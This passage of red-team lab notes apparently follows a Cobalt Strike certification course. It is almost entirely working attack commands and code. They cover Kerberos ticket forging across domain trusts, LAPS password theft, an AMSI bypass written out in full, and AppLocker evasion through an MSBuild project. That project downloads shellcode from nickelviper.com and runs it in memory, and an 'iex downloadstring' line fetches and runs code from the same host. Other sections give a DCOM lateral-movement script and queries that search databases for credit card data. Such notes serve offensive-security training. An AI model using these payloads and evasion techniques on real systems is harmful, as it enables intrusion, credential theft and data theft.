beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```

### One-Way Inbound

```bash
beacon> powershell Get-DomainTrust
beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
beacon> run klist
beacon> ls \\dc.dev-studio.com\c$
```

### One-Way Outbound

>   As a challenge, try and find a way to get DA in this forest.

```bash
beacon> powershell Get-DomainTrust -Domain cyberbotic.io
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
beacon> mimikatz lsadump::trust /patch
# or
beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
beacon> run klist
beacon> powershell Get-Domain -Domain msp.org
```

## LAPS

### Check

```bash
beacon> ls C:\Program Files\LAPS\CSE
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
```

### Discover

```bash
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

ObjectDN                                                      SecurityIdentifier                          
--------                                                      ------------------                          
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107
CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io   S-1-5-21-569305411-121244042-2357301523-1108
CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301523-1108
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
DEV\Support Engineers
# or
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups
```

### Read

```bash
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$
```

### Password Expiration

- https://www.epochconverter.com/ldap

> 136257686710000000 = GMT: Wednesday, 13 October 2032 15:44:31

```bash
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
```

### LAPS Backdoor

Modify .dll and add backdoor to them.

## Antivirus

> Check with `Get-MpThreatDetection`


### Artifact Kit

> You should learn that

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```

```c
//Edit patch.c line 114
for (int x = 0; x < length; x++) {
    char* a = (char *)ptr + x;
    char* b = (char *)buffer + x;
    // random
    GetTickCount();
    *a = *b ^ key[x % 8];
}

//Open bypass-pipe.c and edit code line # 130
sprintf(pipename, "%c%c%c%c%c%c%c%c%calux\\crto", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

### Malleable C2

```c
stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}
```

### AMSI

> Change the lines that ThreatCheck report and save it. Repeat this process

just host your stageless PowerShell payload directly via Site Management > Host File

```bash
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
```

```powershell
# Content
for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}
# Replace for
for ($i = 0; $i -lt $enc.Count; $i++) {
    $enc[$i] = $enc[$i] -bxor 35
}
```
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/resource> ./build.sh /mnt/c/Tools/cobaltstrike/resources
```

### AMSI Disabled

> amsi_disable only applies to powerpick, execute-assembly and psinject.  It does not apply to the powershell command.

```bash
attacker@ubuntu ~/cobaltstrike> vim c2-profiles/normal/webbug.profile
# edit
post-ex {
        set amsi_disable "true";
}
# Check
attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile
```

### Manual AMSI Bypass



```powershell
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP
{
    public class Amsi
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void Bypass()
        {
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);
            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```

```powershell
PS C:\Users\bfarmer> iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```

### Behavioural Detections

>   The sysnative and syswow64 paths should be used rather than system32.

```bash
# change default rundll32
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
```
```bash
beacon> powerpick Get-Process -Id $pid | select ProcessName
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-Domain
# reverse
beacon> spawnto
# if you not change c2 profile you should can add this
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
ak-settings service [name]
```

#### Modify C2 

```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

### Parent/Child Relationships

```vb
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
```

### Command Line detections

This is detected by AV

```bash
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# equal to 
sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:"%COMSPEC% /c echo 9c91bb58485 > \\.\pipe\34a65a"
```

```bash
#change for that
beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
beacon> steal_token 17896
beacon> ls \\web.dev.cyberbotic.io\c$
```

## Aplication Whitelisting

### AppLocker

As a defence, AppLocker is only as good as the defined ruleset.  Microsoft ships default rules, which are very broad and allow all executables and scripts located in the Program Files and Windows directories.

#### Policy Enumeration

```bash
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

### Writable paths

> The default rules allow execution from anywhere within C:\Program Files and C:\Windows (including subdirectories)

```bash
beacon> powershell Get-Acl C:\Windows\Tasks | fl
```

### LOLBAS

> They allow us to bypass AppLocker, because they're allowed to execute under the normal allow criteria 

```bash
msbuild.exe test.csproj
```

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### Powershell CLM

> If you try to run a script or command in PowerShell and see an error like "only core types in this language mode", then you know you're operating in a restricted environment

```bash
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

```c#
//msbuild.exe posh.csproj
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### DLL

```bash
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```


## Data Hunting

### Shares

```bash
# searches for computer shares on the domain
# -CheckShareAccess parameter only shows that shares the current user has read access to.
beacon> powershell Find-DomainShare -CheckShareAccess
# searches each share, returning results where the specified strings appear in the path.
beacon> powershell Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
# read file
beacon> powershell gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5
```

### Database

```bash
# search particular keywords
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
# List tables
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```

### Exfiltration

- https://github.com/RedSiege/Egress-Assess

## Extending Cobalt Strike (Agressor)

### Mimikatz

> If you get this error `ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list` with `beacon> logonpasswords`

```bash
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> pwd
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/mimikatz> ./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
# Load mimikatz.cna via the Cobalt Strike > Script Manager menu and clicking the Load button.  After loading the CNA, Mimikatz will now function as expected.
beacon> logonpasswords
```

### Jump & Remote-Exec

#### Add Invoke-Dcom.ps1 to jump

> Make sure to load the script via the Script Manger (Cobalt Strike > Script Manager).

```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

### Beacon Object Files

- https://github.com/trustedsec/CS-Situational-Awareness-BOF
- https://github.com/CCob/BOF.NET
- https://github.com/fortra/nanodump
- https://github.com/outflanknl/InlineWhispers

```c
# Codigo hello world bof
extern "C" {
#include "beacon.h"

void go(char* args, int len) {
    DFR_LOCAL(USER32, MessageBoxA);

    datap parser;
    char* message;

    // prepare data parser
    BeaconDataParse(&parser, args, len);

    // unpack data
    message = BeaconDataExtract(&parser, NULL);

    // show message
    MessageBoxA(nullptr, message, "Alert", 0);
}
```

```cs
# aggresor script
alias hello-world {
    local('$handle $bof $args');
    
    # read the bof file (assuming x64 only)
    $handle = openf(getFileProper("C:\\Tools\\bofs\\x64\\Release", "demo.x64.o"));
    $bof = readb($handle, -1);
    closef($handle);
    
    # print task to console
    btask($1, "Running Hello World BOF");

    # pack arguments
    $args = bof_pack($1, "z", $2);
    
    # execute bof
    beacon_inline_execute($1, $bof, "go", $args);
}

# register a custom command
beacon_command_register("hello-world", "Execute Hello World BOF", "Loads demo.x64.o and calls the \"go\" entry point.");
```

### Malleable Profile

- https://github.com/Cobalt-Strike/Malleable-C2-Profiles

